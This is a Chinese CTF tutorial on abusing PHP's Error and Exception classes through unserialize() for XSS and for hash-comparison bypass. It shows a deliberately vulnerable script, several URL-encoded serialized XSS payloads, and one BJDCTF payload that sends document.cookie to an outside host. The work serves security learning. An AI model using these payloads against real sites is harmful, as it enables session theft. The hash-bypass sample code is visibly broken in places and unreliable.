# PHP 原生类在 CTF 中的利用
## 译文声明
本文为翻译文章，具体内容及含义以原文为准。

## 前言
在CTF题目中，多次遇到利用PHP原生类进行XSS、反序列化、SSRF、XXE以及读文件的情况。每次遇到这类问题时都会卡住一段时间，一直想深入研究PHP原生类在CTF中的应用，但因种种原因拖延至今。今天终于有机会对此进行总结。我们可以使用以下方法遍历PHP的内置类：

```php
$classes = get_declared_classes();
foreach ($classes as $class) {
    echo $class . "\n";
}
```

当PHP对象被当作字符串输出或使用（如`echo`）时，会触发其`__toString`方法。这是一种新的挖洞思路。

### 使用 `Error` 内置类构造 XSS

#### 测试代码
假设我们有一个反序列化函数，但没有提供可以反序列化的类，这时可以考虑使用PHP内置类来进行反序列化。

```php
function unserializeData($data) {
    return unserialize($data);
}

if (isset($_GET['data'])) {
    $unserialized = unserializeData($_GET['data']);
    echo $unserialized;
} else {
    highlight_file(__FILE__);
}
```

#### POC
```php
// 输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

成功弹窗。

### 使用 `Exception` 内置类

#### 适用版本
- PHP 5 和 PHP 7
- 开启报错的情况下

#### 测试代码
```php
function unserializeData($data) {
    return unserialize($data);
}

if (isset($_GET['data'])) {
    $unserialized = unserializeData($_GET['data']);
    echo $unserialized;
} else {
    highlight_file(__FILE__);
}
```

#### POC
```php
// 输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

### [BJDCTF 2nd]xss之光

进入题目后，通过git泄露获取源码，得到如下payload：

```php
/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

执行后，flag会在cookie中显示。

## 使用 `Error`/`Exception` 内置类绕过哈希比较

上文中介绍了`Error`和`Exception`这两个PHP内置类，它们不仅可用于XSS攻击，还可以通过巧妙构造绕过`md5()`和`sha1()`函数的比较。

### `Error` 类

**Error** 是所有PHP内部错误类的基类，从PHP 7.0.0开始引入。

**类摘要：**
```php
class Error implements Throwable {
    protected string $message;
    protected int $code;
    protected string $file;
    protected int $line;

    public function __construct(string $message = "", int $code = 0, Throwable $previous = null);
    final public function getMessage(): string;
    final public function getPrevious(): Throwable;
    final public function getCode(): mixed;
    final public function getFile(): string;
    final public function getLine(): int;
    final public function getTrace(): array;
    final public function getTraceAsString(): string;
    public function __toString(): string;
    final private function __clone(): void;
}
```

**类属性：**
- `message`：错误消息内容
- `code`：错误代码
- `file`：抛出错误的文件名
- `line`：抛出错误在该文件中的行数

**类方法：**
- `__construct`：初始化 error 对象
- `getMessage`：获取错误信息
- `getPrevious`：返回先前的 Throwable
- `getCode`：获取错误代码
- `getFile`：获取错误发生时的文件
- `getLine`：获取错误发生时的行号
- `getTrace`：获取调用栈
- `getTraceAsString`：获取字符串形式的调用栈
- `__toString`：error 的字符串表达
- `__clone`：克隆 error

### `Exception` 类

**Exception** 是所有异常的基类，从PHP 5.0.0开始引入。

**类摘要：**
```php
class Exception {
    protected string $message;
    protected int $code;
    protected string $file;
    protected int $line;

    public function __construct(string $message = "", int $code = 0, Throwable $previous = null);
    final public function getMessage(): string;
    final public function getPrevious(): Throwable;
    final public function getCode(): mixed;
    final public function getFile(): string;
    final public function getLine(): int;
    final public function getTrace(): array;
    final public function getTraceAsString(): string;
    public function __toString(): string;
    final private function __clone(): void;
}
```

**类属性：**
- `message`：异常消息内容
- `code`：异常代码
- `file`：抛出异常的文件名
- `line`：抛出异常在该文件中的行号

**类方法：**
- `__construct`：异常构造函数
- `getMessage`：获取异常消息内容
- `getPrevious`：返回异常链中的前一个异常
- `getCode`：获取异常代码
- `getFile`：创建异常时的程序文件名称
- `getLine`：获取创建的异常所在文件中的行号
- `getTrace`：获取异常追踪信息
- `getTraceAsString`：获取字符串类型的异常追踪信息
- `__toString`：将异常对象转换为字符串
- `__clone`：异常克隆

### 绕过哈希比较

在`Error`和`Exception`这两个PHP原生类中，只有`__toString`方法，用于将异常或错误对象转换为字符串。我们可以利用这个特性来绕过哈希比较。

#### 示例代码
```php
class Test {
    public $syc;
    public $lover;

    public function __toString() {
        return "test";
    }
}

$test = new Test();
$test->syc = new Error("test");
$test->lover = new Error("test");

if (($test->syc != $test->lover) && (md5($test->syc) === md5($test->lover)) && (sha1($test->syc) === sha1($test->lover))) {
    if (!preg_match("/\syc, $match)) {
        eval($this->syc);
    } else {
        die("Try Hard !!");
    }
}
```

可见，需要进入`eval()`执行代码需要先通过上面的`if`语句：
```php
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc) === sha1($this->lover)) )
```

这里的关键是`md5()`和`sha1()`可以对一个类进行哈希，并且会触发这个类的`__toString`方法；当`eval()`函数传入一个类对象时，也会触发这个类里的`__toString`方法。

因此，我们可以使用含有`__toString`方法的PHP内置类来绕过，常用的两个内置类是`Exception`和`Error`。由于题目过滤了小括号无法调用函数，我们可以尝试直接`include "/flag"`将flag包含进来。由于过滤了引号，我们可以直接用URL编码绕过。